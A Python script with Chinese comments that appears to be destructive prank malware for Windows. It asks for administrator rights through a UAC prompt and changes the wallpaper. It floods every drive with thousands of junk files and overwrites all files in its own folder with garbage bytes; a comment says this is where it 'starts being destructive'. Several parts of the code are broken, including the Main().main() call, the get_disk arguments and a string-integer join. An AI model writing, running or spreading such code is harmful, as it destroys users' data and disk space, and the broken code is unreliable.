from __future__ import print_function

import ctypes
import os
import string
import sys

from pyscreeze import unicode


def root():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if is_admin():
        print('start')
        Main().main()
    else:
        if sys.version_info[0] == 3:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        else:  # in python2.x
            ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)


def Main():
    import os, sys
    import string
    import random
    import winreg

    import easygui as eg

    # 更改桌面背景
    def desktop_bg():
        def setWallpaper():
            import random
            import ctypes
            import time
            import os

            # 存储图片的文件夹
            path = r"./images/bg.jpg";

            # 设置桌面壁纸
            ctypes.windll.user32.SystemParametersInfoW(20, 1, path, 0)

        setWallpaper()

    # desktop_bg()
    def get_disk(self):
        # 获取电脑上的所有磁盘
        global disk_list
        disk_list = []
        for c in string.ascii_uppercase:
            disk = c + ':'
            if os.path.isdir(disk):
                disk_list.append(disk)
        print(disk_list)

    # 在电脑上创建一大堆文件
    def fill():
        # 产生一个随机数
        rand = random.randint(1, 1000)
        # 在每个磁盘里创建无数个文件
        get_disk()
        for i in disk_list:
            os.makedirs(i + "\\" + str(rand))
            for j in range(1, 10000):
                with open((str(i) + '/' + str(rand) + '/' + str(j) + '.pyd'), 'wb+') as f:
                    f.write(b'57297483270580238590472895037589407358920573825906789890890605347686947064830756890753684960745386905346786940769754689079078469057839607436589067835960785906738460547684378695078903786905768390672395090769025684906738906785096734867356873695607368590673486905789704860546734-3845084205-8423593205-82904-8908-9405-842305-892358-920589-34258405-82395084-5823589840259038935-8305-82395084903223805-898-2-8594-086907689067-847956078908-69507-85697068790-843502950-75687t657375083853435890237689506734860')
                    f.close()
        # 获取桌面路径
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
        print(winreg.QueryValueEx(key, "Desktop")[0])
        # 开始有杀伤力了
        # 在桌面创建无数个文件
        for j in range(1, 10):
            with open((winreg.QueryValueEx(key, "Desktop")[0] + '\\123txt'+j), 'wb+') as f:
                f.close()
        # 获取电脑里所有的文件
        current_address = os.path.dirname(os.path.abspath(__file__))
        file_list = os.listdir(current_address)
        for file_address in file_list:
            file_address = os.path.join(current_address, file_address)
            if os.path.isfile(file_address):
                #print("这个是文件，文件名称：", file_address)
                with open(file_address, 'wb+') as f:
                    f.write(b'21315356278462373284526745845637586457238956')
                    f.close()

    # 主程序
    def main():
        print()
        desktop_bg()
        fill()

    main()


if __name__ == '__main__':
    print('执行中……')
    root()
    input()
